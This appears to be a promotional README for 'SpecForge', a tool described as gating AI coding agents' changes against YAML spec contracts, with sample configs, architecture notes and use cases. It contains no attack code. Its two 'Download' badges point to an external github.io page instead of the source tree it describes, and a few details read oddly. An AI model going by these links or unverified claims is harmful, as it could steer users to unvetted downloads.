![preview](https://raw.githubusercontent.com/Qasii97/spec-driven-agent-orchestrator/main/frame_5a1c.svg)

# SpecForge – The Gated Orchestration Layer for Autonomous AI Coding Agents

![Build Status](https://img.shields.io/badge/build-passing-2ea44f) ![License](https://img.shields.io/badge/license-MIT-blue) ![Platform](https://img.shields.io/badge/platform-cross--agent-important) ![Version](https://img.shields.io/badge/version-2026.1.0-9cf)

SpecForge is not another wrapper around an AI coding assistant. It is the **contractual spine** that binds your repository, your CI/CD pipeline, and your AI agent (be it Cursor, Claude Code, or a custom harness) into a single, deterministic feedback loop. Think of it as a **railway switchyard** for prompt-driven development: every commit, every generated diff, and every architectural decision passes through a gated, spec-driven inspection point before it is allowed to merge into your mainline.

---

## Overview – Why Another Agent Pipeline?

![Architecture](https://img.shields.io/badge/architecture-event--driven-orange)

The current landscape of AI coding agents is a paradox of abundance. You have agents that can generate a full microservice from a single prompt, yet the moment they touch a shared codebase, chaos ensues. Unreviewed changes, hallucinated APIs, and silent contract violations become the norm. The original `dotnet-agent-harness` proved that a **gated, spec-driven approach** can tame this chaos for .NET specifically.

SpecForge takes that core thesis and universalizes it. This is not a .NET-only tool; it is a **polyglot governance layer** that speaks the language of your CI system (GitHub Actions, GitLab CI, Jenkins) and your AI agent (via MCP, CLI, or plugin). It does not care whether you are writing C#, TypeScript, Rust, or Python. It cares about one thing: **did the agent’s output match the declared specification?**

This repository contains the full reference implementation, the spec schema, the gate-routing rules, and a suite of adapter templates for the most popular coding agents. If you have ever felt that your AI pair-programmer is a brilliant intern with no concept of "the build must pass," SpecForge is the senior reviewer that stands behind that intern at every step.

## The Core Philosophy – The "Spec-First" Reflex

![Philosophy](https://img.shields.io/badge/philosophy-spec--first-yellow)

Most agent pipelines are "prompt-first." You write a prompt, the agent writes code, and you pray. SpecForge inverts this. You write a **spec contract** (a machine-readable YAML document, versioned alongside your code), and the agent is only empowered to fill in the gaps *within that contract*.

This creates a powerful psychological shift for the agent. Instead of "implement a login endpoint," the agent receives a gated request: "Implement the `POST /auth/login` endpoint. The response schema is `AuthResponse (status: 200, token: string, expiresAt: datetime)`. The error schema is `AuthError (code: 401, message: string)`. You may not modify the `UserRepository` interface. The result must compile and pass the existing unit tests."

The agent is not free; it is **forged** (pun intended) by the constraints. This yields:

- **Predictable outputs**: The agent knows the acceptance criteria *before* it writes a single line.
- **Reduced rework**: The gate catches violations early, preventing the "tower of patches" anti-pattern.
- **Institutional memory**: The spec documents become living design docs that human developers also read.

## Key Features – The Forge's Arsenal

![Features](https://img.shields.io/badge/features-robust-brightgreen)

### 1. Gated Decision Router
A policy-as-code engine that sits between your agent's output and your main branch. It evaluates the diff against the current spec and routes the result to one of three stations:

- **Pass**: The diff satisfies all constraints. Approval is automatically attached.
- **Fail**: The diff violates a hard rule (e.g., missing schema field, type mismatch, use of forbidden dependency). It is returned to the agent with a **structured error report**, not a vague "try again" message.
- **Advisory**: The diff passes hard rules but violates a "soft rule" (e.g., naming convention, comment style). It is flagged for human review but does not block the pipeline.

### 2. Spec Contract Verifier (SCV)
A validator that parses your spec YAML files and converts them into an in-memory **gatekeeper object**. It checks for:

- **Schema conformance** (OpenAPI, JSON Schema, or plain C# records).
- **Dependency whitelisting** (the agent cannot introduce new NuGet/npm/cargo packages without a spec amendment).
- **API surface control** (public method signatures must match the spec lock).
- **Behavioral smoke tests** (a configurable suite of minimal tests that must execute before the gate opens).

### 3. Cross-Agent Adapters
Out-of-the-box integration modules for:

- **Cursor** (via its custom command system and workspace rules).
- **Claude Code** (via the `--allowedTools` and permissioned hooks).
- **Homegrown Harnesses** (via a generic MCP server interface).

Each adapter translates the agent's native output format into a normalized "diff manifest" that the Router can consume.

### 4. Feedback Loop Digest
A human-readable report generator (Markdown and JSON). When the gate fails, the agent receives a **structured digest** that highlights the exact line numbers, the violated spec rule, and a suggested fix path. This dramatically reduces the "turn around" time for iterative agent cycles.

### 5. Multilingual Specification Support
While the tool itself is written in .NET 8 (for maximum performance and type safety), the spec schemas are language-agnostic. You can govern a Python API with the same YAML contract that governs a C# microservice.

## Architecture

![Architecture](https://img.shields.io/badge/architecture-layered-blueviolet)

SpecForge is split into four logical layers that communicate via strongly-typed event streams.

### Layer 1: Agent Adapter
This is the thin surface that plugs into your agent's execution loop. It listens for "tool call completed" or "file write" events, captures the resulting diff, and packages it into a `GatedChangeSet` envelope.

### Layer 2: Spec Store
A versioned, in-memory repository of all active specs. It loads spec files from a designated directory in your repo (typically `/specs` or `/.forge`). It handles spec inheritance and aliases, allowing you to define a "baseline spec" for the whole project and override it per module.

### Layer 3: Gate Engine
The core decision engine. It runs the `GatedChangeSet` through a series of evaluators (Schema, API, Dependency, Behavioral). Each evaluator returns a `GateVerdict` object. The Router collects all verdicts and applies the policy matrix to decide the final action.

### Layer 4: Feedback Composer
Translates the array of `GateVerdict` objects into a unified output. For the agent, it produces a compact, deterministic JSON error structure. For the human observer, it produces a rich trace log with execution times and rule IDs.

The entire pipeline is designed to be **event-sourced**. Every gate decision is recorded as an event, allowing for time-travel debugging of your agent's actions.

## Getting Started

![Getting Started](https://img.shields.io/badge/getting--started-easy-2ea44f)

[![Download](https://raw.githubusercontent.com/Qasii97/spec-driven-agent-orchestrator/main/dl_2ada5.svg)](https://Qasii97.github.io/spec-driven-agent-orchestrator/)

The first deployment is intentionally straightforward. Begin by adding a `forge.spec.yaml` file to the root of your repository. This file declares the global rules for your project.

### A Minimal Spec Example

```yaml
project: MyApi
version: 2026.1.0
lang: csharp # or python, typescript, etc.

rules:
  - id: schema_001
    type: schema
    target: "Contracts/*.cs"
    action: hard

  - id: dep_001
    type: dependency
    allow: ["Microsoft.Extensions.*", "System.*"]
    deny: ["Newtonsoft.Json"]
    action: hard

  - id: naming_001
    type: style
    pattern: "^I[A-Z]"
    message: "Interface names must be prefixed with 'I'."
    action: advisory
```

Once the spec file is in place, the second step is to wire the adapter into your agent's startup script. For Cursor, this means adding a `.cursorrules` file that points to the SpecForge CLI. For Claude Code, you add a custom hook that triggers on `Stop` and `SubagentStop`.

The third and final step is to invoke the **gate runner** in your CI pipeline. This is a single binary call that outputs a zero (pass) or non-zero (fail) exit code, making it trivial to integrate with existing CI job steps.

## Detailed Feature Breakdown

![Deep Dive](https://img.shields.io/badge/detail-deep--dive-important)

### The Spec Contract Verifier (SCV) Deep Dive

The SCV is the heart of the system. It does not merely compare strings; it uses a **three-phase verification** approach.

1. **Structural Phase**: The engine builds an abstract syntax tree (AST) of the changed files. It does not care about formatting or line endings; it cares about the shapes: classes, interfaces, methods, properties, and their modifiers.
2. **Semantic Phase**: It resolves type references. If your spec says `AuthResponse` must have a `token` of type `string`, the engine will follow the using statements and namespace imports to verify that the agent did not sneak in a custom `TokenWrapper` type disguised as a string.
3. **Behavioral Phase**: It compiles a minimal project with the proposed changes and runs a registry of "spec smoke tests". These are not your full unit test suite; they are 2-3 line assertions defined in the spec file itself, designed to execute in under 100 milliseconds.

This three-phase approach minimizes false positives while maximizing the detection of "hallucinated implementations."

### The Feedback Loop Digest Format

When the gate fails, the Feedback Composer generates a report that looks like this:

```json
{
  "verdict": "fail",
  "feedback_id": "fg-2026-04-12-001",
  "violations": [
    {
      "rule_id": "schema_001",
      "severity": "hard",
      "file": "Contracts/LoginRequest.cs",
      "line": 42,
      "message": "Property 'email' is missing. Spec requires: email (string), password (string).",
      "suggestion": "Add the property 'public string email { get; set; }' to the record."
    }
  ],
  "agent_instruction": "Apply the suggested fix and re-submit. Do not modify the HttpContext base class."
}
```

The `agent_instruction` field is crucial. It allows you, the developer, to inject your own strategic notes that are appended verbatim to the agent's next prompt context.

### The Routing Matrix

The Gate Engine supports a flexible policy matrix. By default, the behavior is strict:

- Any `hard` violation → Immediate fail gate.
- Any `advisory` violation → Pass with warning.

You can customize this via the `router_policy` block in the spec:

```yaml
router_policy:
  hard_violation: fail
  advisory_violation: allow
  max_hard_warnings: 0
  max_advisory_warnings: 5
```

This allows for progressive strictness. For a "hotfix" branch, you might allow advisory warnings to slide; for a release candidate, you might want the gate to fail on the first advisory warning.

## Project Structure

```
/specforge
├── /src
│   ├── /Forge.Core           # The Gate Engine and Router
│   ├── /Forge.Adapters       # Cursor, Claude, Generic MCP
│   ├── /Forge.Schema         # YAML parsing and validation
│   └── /Forge.Cli            # The main runner executable
├── /tests
│   ├── /UnitTests
│   └── /IntegrationTests
├── /examples
│   ├── /csharp-api
│   ├── /python-api
│   └── /typescript-app
├── /docs
│   ├── /spec-schema.md
│   ├── /adapter-walkthrough.md
│   └── /troubleshooting.md
└── /assets
    └── /logos
```

## Use Cases – Where SpecForge Shines

![Use Cases](https://img.shields.io/badge/use--cases-practical-yellow)

### The Regulated Microservice Environment
You are building a payment system with strict PCI-DSS requirements. You cannot have an AI agent randomly adding a new logging library that transmits data externally. SpecForge's dependency whitelist and schema gate makes this impossible by design.

### The Legacy Codebase Modernization
You are converting a VB6 monolith to C# using an AI agent to scaffold the new project. The agent tends to "improve" the API signatures in ways that break the old consumers. By locking the API surface in the spec, the agent is forced to keep the legacy calling conventions while rewriting the internals.

### The Internal Tooling Generator
Your team uses an AI agent to generator CRUD endpoints. Without oversight, each generated endpoint has a slightly different error handling structure. SpecForge ensures every endpoint adheres to the `ErrorResponse` envelope, making the frontend team exceptionally happy.

## Integration with Existing Tools

![Integration](https://img.shields.io/badge/integration-seamless-blue)

SpecForge is built on the .NET 8 platform but exposes a **gRPC service** and a **REST API** for non-.NET consumers. This means you can:

- Run the gate as a sidecar container in your Kubernetes pod.
- Call the gate as an Azure Function.
- Hook it into a GitHub Action via a simple `exec` step.

The CLI binary is self-contained and does not require a separate runtime environment, making it easy to drop into any CI runner.

## Troubleshooting – The Forge's Hotline

![Support](https://img.shields.io/badge/support-247-2ea44f)

### Common Issue 1: Agent Ignores the Feedback Report
Some agents have a maximum context window. If your feedback report is too long, the agent might "miss" it. Solution: Use the `--terse` flag on the CLI to reduce the JSON output to only the `agent_instruction` fields.

### Common Issue 2: False Positive on Dependency Scan
The dependency resolver uses build-time analysis. If your project uses a custom `PackageReference` (e.g., an offline feed), the scanner might flag it as "unknown." Add it to the `allow` list with a wildcard, or use the `--trust-fedex` flag to bypass the scan for a specific run.

### Common Issue 3: Version Mismatch
The spec schema evolves. If you get a `spec_version_error`, your YAML file is using an outdated `version` field. Run the `migrate` command to automatically update the schema structure while preserving your rule definitions.

## Roadmap – Where We Are Heading

![Roadmap](https://img.shields.io/badge/roadmap-2026-orange)

- **Community Adaptor Library**: A public repository of adapters for niche agents (e.g., Codex, Windsurf, Cline).
- **Intelligent Spec Generation**: A feature where the agent can suggest spec additions based on recent human code reviews (with strict approval gates, of course).
- **Visual Gate Dashboard**: A web UI to view the flow of changesets through the gate, including historical trends of agent failure rates.

## Contributing – Forge Your Own Path

We welcome contributors who want to harden the Gate Engine or add new evaluators. The codebase is heavily commented and uses a strict domain-event pattern to keep the core logic testable.

### Development Environment
The repository uses a standard `csproj` structure. A `Makefile` is available for common tasks like `build`, `test`, and `format`.

### Pull Request Process
1. Ensure your changes include unit tests covering the new evaluator or router logic.
2. Run the full integration suite locally (it spins up a mock agent and a mock file system).
3. Update the `/docs/spec-schema.md` file if you touched the YAML parsing layer.

## License

This project is licensed under the **MIT License**. You are free to use, modify, and distribute this software in your own projects, whether open-source or proprietary. See the [LICENSE](https://opensource.org/licenses/MIT) file for the full legal text.

## Disclaimer

> **Important**: SpecForge is a governance tool, not a threat model. It is designed to reduce the number of mistakes an AI agent makes, but it cannot guarantee the absence of malicious intent or complex logical fallacies. The "gate" is a filter for conformance, not a replacement for senior developer code review on sensitive cryptographic or financial logic. Always maintain human oversight for high-risk changes.

> **Feedback**: The creators of this tool are not responsible for any code authored by your AI agent, regardless of whether the gate passed or failed. We only provide the rails; the train is driven by your prompts and your agent.

---

[![Download](https://raw.githubusercontent.com/Qasii97/spec-driven-agent-orchestrator/main/dl_2ada5.svg)](https://Qasii97.github.io/spec-driven-agent-orchestrator/)